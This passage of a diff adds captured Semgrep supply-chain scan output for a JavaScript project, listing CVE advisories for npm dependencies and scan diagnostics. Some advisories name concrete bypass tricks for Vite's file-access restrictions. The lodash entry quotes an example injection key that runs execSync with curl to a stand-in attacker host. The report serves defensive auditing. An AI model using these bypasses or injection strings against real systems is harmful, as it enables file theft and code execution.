+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          1889┆ vite@5.4.14:
+   
+   ❯❯❯❱ vitest - CVE-2026-47429
+          Severity: CRITICAL                                                                                
+          Affected versions of vitest are vulnerable to Missing Authorization. When the Vitest UI server is 
+          listening, the deprecated isFileServingAllowed check is applied without normalizing the URL before
+          filesystem operations, allowing path traversal that lets an attacker read, write, and execute     
+          arbitrary files outside the project directory.                                                    
+                                                                                                            
+           ▶▶┆ Fixed for vitest at versions: 3.2.6, 4.1.0
+          1920┆ vitest@0.34.4:
+   
+   ❯❯❱ ws - CVE-2026-48779
+          Severity: HIGH                                                                                    
+          Affected versions of ws are vulnerable to Allocation of Resources Without Limits or Throttling /  
+          Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. An     
+          attacker can cause memory exhaustion and out-of-memory process termination in ws by sending a high
+          volume of exceptionally small WebSocket fragments and data chunks, forcing excessive allocation of
+          internal frame-buffer wrappers beyond the documented maxPayload limit. The flaw resides in ws     
+          internal frame-reassembly logic, so any application that uses ws to send or receive WebSocket     
+          traffic is affected regardless of how the API is called.                                          
+                                                                                                            
+           ▶▶┆ Fixed for ws at versions: 5.2.5, 6.2.4, 7.5.11, 8.21.0
+          2005┆ ws@8.18.0:
+                  
+    pnpm-lock.yaml
+   ❯❯❱ cross-spawn - CVE-2024-21538
+          Severity: HIGH                                                                               
+          Affected versions of cross-spawn are vulnerable to Inefficient Regular Expression Complexity.
+                                                                                                       
+           ▶▶┆ Fixed for cross-spawn at versions: 6.0.6, 7.0.5
+          939┆ cross-spawn@7.0.3:
+   
+   ❯❯❱ flatted - CVE-2026-32141
+          Severity: HIGH                                                                                    
+          Affected versions of flatted are vulnerable to Uncontrolled Recursion. `flatted.parse()` is       
+          vulnerable to a denial-of-service due to unbounded recursion in its internal `revive()` phase when
+          resolving circular references. A maliciously crafted flatted-JSON payload containing deeply nested
+          and/or self-referential `$` index references can trigger excessive recursion, causing a "Maximum  
+          call stack size exceeded" stack overflow and crashing the Node.js process. Applications that parse
+          untrusted input with `flatted.parse()` can be taken down by an unauthenticated attacker with a    
+          single request.                                                                                   
+                                                                                                            
+           ▶▶┆ Fixed for flatted at version: 3.4.0
+          1342┆ flatted@3.3.2:
+   
+   ❯❯❱ flatted - CVE-2026-32141
+          Severity: HIGH                                                                                    
+          Affected versions of flatted are vulnerable to Uncontrolled Recursion. `flatted.parse()` is       
+          vulnerable to a denial-of-service due to unbounded recursion in its internal `revive()` phase when
+          resolving circular references. A maliciously crafted flatted-JSON payload containing deeply nested
+          and/or self-referential `$` index references can trigger excessive recursion, causing a "Maximum  
+          call stack size exceeded" stack overflow and crashing the Node.js process. Applications that parse
+          untrusted input with `flatted.parse()` can be taken down by an unauthenticated attacker with a    
+          single request.                                                                                   
+                                                                                                            
+           ▶▶┆ Fixed for flatted at version: 3.4.0
+          1342┆ flatted@3.3.2:
+   
+   ❯❯❱ flatted - CVE-2026-33228
+          Severity: HIGH                                                                                      
+          Affected versions of flatted are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). The parse() and fromJSON() entry points in flatted    
+          deserialize through parse(); attacker-controlled index strings can be used as array keys without    
+          numeric validation. Crafted payloads using keys such as __proto__ can surface Array.prototype as an 
+          ordinary parsed value; if downstream code assigns properties on that reference, the global prototype
+          chain can be polluted, enabling denial of service or unsafe behavior.                               
+                                                                                                              
+           ▶▶┆ Fixed for flatted at version: 3.4.2
+          1342┆ flatted@3.3.2:
+   
+   ❯❯❱ form-data - CVE-2026-12143
+          Severity: HIGH                                                                                      
+          Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF   
+          Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the
+          field name and `filename` option passed to `FormData#append()`. These values are concatenated       
+          directly into the `Content-Disposition` header, so passing untrusted input as a field name or       
+          filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g.
+          overriding backend-trusted fields).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for form-data at versions: 2.5.6, 3.0.5, 4.0.6
+          1352┆ form-data@4.0.4:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1771┆ lodash@4.17.21:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1771┆ lodash@4.17.21:
+   
+   ❯❯❱ picomatch - CVE-2026-33671
+          Severity: HIGH                                                                                      
+          Affected versions of picomatch are vulnerable to Inefficient Regular Expression Complexity.         
+          Picomatch can compile certain extglob patterns (for example quantified +() and *() forms) into      
+          regular expressions with catastrophic backtracking, causing ReDoS and event-loop blocking when those
+          patterns are compiled or matched                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1952┆ picomatch@2.3.1:
+   
+    ❯❱ qs - CVE-2025-15284
+          Severity: MODERATE                                                                                
+          Affected versions of qs are vulnerable to Improper Input Validation. The `arrayLimit` option in   
+          qs.parse() is not enforced for bracket notation (`a[]=…`), so an attacker can send a query with a 
+          huge number of `a[]` parameters, causing qs to allocate an unbounded array in memory and trigger a
+          denial-of-service via memory exhaustion.                                                          
+                                                                                                            
+           ▶▶┆ Fixed for qs at version: 6.14.1
+          2031┆ qs@6.14.0:
+   
+   ❯❯❱ tmp - CVE-2026-44705
+          Severity: HIGH                                                                                     
+          Affected versions of tmp are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). The tmp package is vulnerable to path traversal (CWE-22). The prefix,
+          postfix, template, and dir options passed to file, fileSync, dir, dirSync, tmpName, and tmpNameSync
+          are concatenated into the generated path without sanitization, so traversal sequences (../) or     
+          absolute paths allow files and directories to be created outside the intended temporary directory. 
+                                                                                                             
+           ▶▶┆ Fixed for tmp at version: 0.2.6
+          2300┆ tmp@0.2.3:
+   
+   ❯❯❱ undici - CVE-2026-12151
+          Severity: HIGH                                                                                      
+          Affected versions of undici are vulnerable to Allocation of Resources Without Limits or Throttling /
+          Uncontrolled Resource Consumption. undici's WebSocket client enforces a cumulative payload-size     
+          limit on a fragmented message but does not limit the number of fragments. A malicious WebSocket     
+          server can stream many small or empty continuation frames that each pass per-frame and cumulative-  
+          size validation, collectively causing unbounded memory growth and denial of service in the client   
+          process. Applications are reachable when they connect a WebSocket or WebSocketStream client to an   
+          untrusted endpoint.                                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for undici at versions: 6.27.0, 7.28.0, 8.5.0
+          2395┆ undici@6.24.1:
+
+
+=== STDERR ===
+                  
+                  
+┌────────────────┐
+│ Debugging Info │
+└────────────────┘
+                  
+  SCAN ENVIRONMENT
+  versions    - semgrep 1.168.0 on python 3.12.13                      
+  environment - running in environment git, triggering event is unknown
+            
+  CONNECTION
+  Initializing scan (deployment=wuwuyn-personal-org, scan_id=192902339)  
+  Enabled products: Supply Chain                                                 
+        
+  ENGINE
+  Using Semgrep Pro Version: 1.168.0
+  Installed at /usr/lib/python3.12/site-packages/semgrep/bin/semgrep-core-proprietary
+               
+               
+┌─────────────┐
+│ Scan Status │
+└─────────────┘
+  Scanning 586 files tracked by git with 0 Code rules, 84986 Supply Chain rules:
+            
+            
+  CODE RULES
+  Nothing to scan.
+                    
+  SUPPLY CHAIN RULES
+                                                                                                                        
+  Dependency Sources                 Resolution Method   Ecosystem   Dependencies   Rules                               
+ ─────────────────────────────────────────────────────────────────────────────────────────                              
+  frontend/pnpm-lock.yaml            Lockfile            Npm         991            84986                               
+  pnpm-lock.yaml                     Lockfile            Npm         588            84986                               
+  libs/copilot/pnpm-lock.yaml        Lockfile            Npm         548            84986                               
+  libs/react-client/pnpm-lock.yaml   Lockfile            Npm         449            84986                               
+  uv.lock                            Failed              Unknown     -                  -                               
+                                                                                                                        
+                                                                                                                        
+  Analysis       Rules                                                                                                  
+ ──────────────────────                                                                                                 
+  Malicious      77530                                                                                                  
+  Basic           5072                                                                                                  
+  Reachability    2384                                                                                                  
+                                                                                                                        
+  Failed to resolve dependencies for pyproject.toml. Parsing dependency output failed (Could not find table: project)
+  Uploading scan results  
+  Finalizing scan                         
+                
+┌──────────────┐
+│ Scan Summary │
+└──────────────┘
+✅ CI scan completed successfully.
+ • Findings: 203 (0 blocking)
+ • Rules run: 127478
+ • Targets scanned: 388
+ • Parsed lines: ~100.0%
+ • Scan skipped: 
+   ◦ Matching --exclude patterns: 7
+   ◦ Files matching .semgrepignore patterns: 51
+ • Scan was limited to files tracked by git
+ • For a detailed list of skipped files and lines, run semgrep with the --verbose flag
+CI scan completed successfully.
+  View results in Semgrep Cloud Platform:
+    https://semgrep.dev/orgs/wuwuyn-personal-org/supply-chain/vulnerabilities?repo=Chainlit__chainlit&ref=HEAD
+  No blocking findings so exiting with code 0
